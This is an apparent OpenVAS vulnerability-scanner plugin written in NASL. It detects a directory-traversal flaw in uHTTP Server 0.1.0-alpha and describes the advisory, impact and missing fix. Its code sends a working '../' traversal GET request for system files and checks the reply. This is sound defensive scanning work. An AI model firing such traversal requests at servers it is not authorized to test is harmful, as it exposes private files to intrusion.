if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.100560" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2010-03-30 12:13:57 +0200 (Tue, 30 Mar 2010)" );
	script_bugtraq_id( 38986 );
	script_tag( name: "cvss_base", value: "5.1" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:H/Au:N/C:P/I:P/A:P" );
	script_name( "uHTTP Server GET Request Directory Traversal Vulnerability" );
	script_xref( name: "URL", value: "http://www.securityfocus.com/bid/38986" );
	script_xref( name: "URL", value: "http://www.salvatorefresta.net/files/adv/uhttp%20Server%200.1.0%20alpha%20Path%20Traversal%20Vulnerability-10032010.txt" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_ATTACK );
	script_family( "Web Servers" );
	script_copyright( "Copyright (C) 2010 Greenbone Networks GmbH" );
	script_dependencies( "gb_get_http_banner.sc", "os_detection.sc" );
	script_require_ports( "Services/www", 8080 );
	script_mandatory_keys( "uhttps/banner" );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "solution", value: "No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore.
  General solution options are to upgrade to a newer release, disable respective features,
  remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "uHTTP Server is prone to a directory-traversal vulnerability because
  it fails to sufficiently sanitize user-supplied input." );
	script_tag( name: "impact", value: "Exploiting this issue will allow an attacker to view arbitrary local
  files and directories within the context of the webserver. Information harvested may aid in launching
  further attacks." );
	script_tag( name: "affected", value: "uHTTP Server 0.1.0-alpha is vulnerable. Other versions may also
  be affected." );
	exit( 0 );
}
require("host_details.inc.sc");
require("os_func.inc.sc");
require("http_func.inc.sc");
require("port_service_func.inc.sc");
require("misc_func.inc.sc");
port = http_get_port( default: 8080 );
banner = http_get_remote_headers( port: port );
if(!banner){
	exit( 0 );
}
if(!ContainsString( banner, "Server: uhttps" )){
	exit( 0 );
}
soc = open_sock_tcp( port );
if(!soc){
	exit( 0 );
}
files = traversal_files( "linux" );
for pattern in keys( files ) {
	file = files[pattern];
	req = NASLString( "GET /../../../../../../" + file + " HTTP/1.0\\r\\n\\r\\n" );
	send( socket: soc, data: req );
	buf = recv( socket: soc, length: 2048 );
	close( soc );
	if(egrep( pattern: pattern, string: buf, icase: TRUE )){
		security_message( port: port );
		exit( 0 );
	}
}
exit( 0 );

